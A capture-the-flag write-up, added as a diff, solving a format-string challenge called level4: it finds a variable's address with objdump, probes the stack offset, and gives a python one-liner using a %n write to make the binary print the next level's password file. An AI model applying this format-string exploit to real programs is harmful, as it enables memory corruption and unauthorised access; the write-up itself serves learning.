@@ -1,0 +1,25 @@
+After decompiling, we saw it was basically the same program as the level3, but it needed a way bigger value to pass the condition
+`  if ( m == 16930116 )
+    return system("/bin/cat /home/user/level5/.pass");`
+
+We had to write 16930116 bytes to the variable m
+
+We lookup to m's address using objdump
+-> objdump -d level4
+`804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
+ 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
+ 8048497:	75 0c                	jne    80484a5 <n+0x4e>`
+
+We see that m's address is 0x8049810
+
+Since the program uses fgets that puts a limit of 512 characters, we had to use a printf format way to write the 16930116 bytes
+-> printf("%10x") will actually write at least 10 bytes
+
+Next, we get the right parameter offset from the printf function
+`printf("aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x")
+aaaa b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825`
+
+We see that the offset is 12
+
+We can now write our exploit
+`python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12\$n"' | ./level4`
